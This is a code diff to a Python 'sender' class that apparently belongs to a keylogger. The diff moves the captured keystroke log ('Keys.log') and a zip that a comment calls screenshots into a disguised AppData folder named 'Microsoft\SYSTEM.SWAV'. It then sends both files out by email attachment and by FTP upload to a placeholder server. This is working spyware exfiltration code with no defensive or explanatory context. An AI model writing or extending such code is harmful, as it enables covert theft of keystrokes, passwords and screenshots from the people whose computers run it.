@@ -1,9 +1,13 @@
 import ftplib
+import os
 import smtplib
 from email import encoders
 from email.mime.base import MIMEBase
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
+
+Directory = 'C:\\Users\\' + \
+    os.getlogin() + '\\AppData\\Roaming\\Microsoft\\SYSTEM.SWAV\\'
 
 
 class sender:
@@ -19,7 +23,7 @@ class sender:
 
             msg["From:"] = user
             msg["To"] = to
-            msg["Subject"] = 'OMG Super Important Message'
+            msg["Subject"] = 'OMG Super Important Message :O'
             body = 'Hey, what up \n'
             body1 = 'ZIP attachments'
 
@@ -27,12 +31,12 @@ class sender:
             msg.attach(MIMEText(body, "plain"))
             filename = "Filename.txt"
             attachment = open(
-                'C:\\SYSTEM.SWAV\\Logs.log', "rb")
+                Directory + 'Keys.log', "rb")
 
             # Defines the ZIP screenshots file that is supposed to be sent
             msg.attach(MIMEText(body1, "plain"))
             filename1 = "Am0ASk2.zip"
-            attachment1 = open('C:\\temp\\Am0ASk2.zip', 'rb')
+            attachment1 = open(Directory + 'Am0ASk2.zip', 'rb')
 
             # Prepares the attachement for the LOG file
             part = MIMEBase("application", "octet-stream")
@@ -73,10 +77,10 @@ class sender:
 
     def FTP():
         session = ftplib.FTP('server.address.com', 'USERNAME', 'PASSWORD')
-        file = open('C:\\SYSTEM.SWAV\\Logs.log')  # LOG to send
-        session.storbinary('STOR Logs.log', file)  # send LOG
+        file = open(Directory + 'Keys.log')  # LOG to send
+        session.storbinary('STOR Keys.log', file)  # send LOG
         file.close()
-        file1 = open('C:\\SYSTEM.SWAV\\Am0ASk2.zip')  # ZIP to send
+        file1 = open(Directory + 'Am0ASk2.zip')  # ZIP to send
         session.storbinary('STOR Am0Sk2.zip', file1)  # send ZIP
         file1.close()
         session.quit()
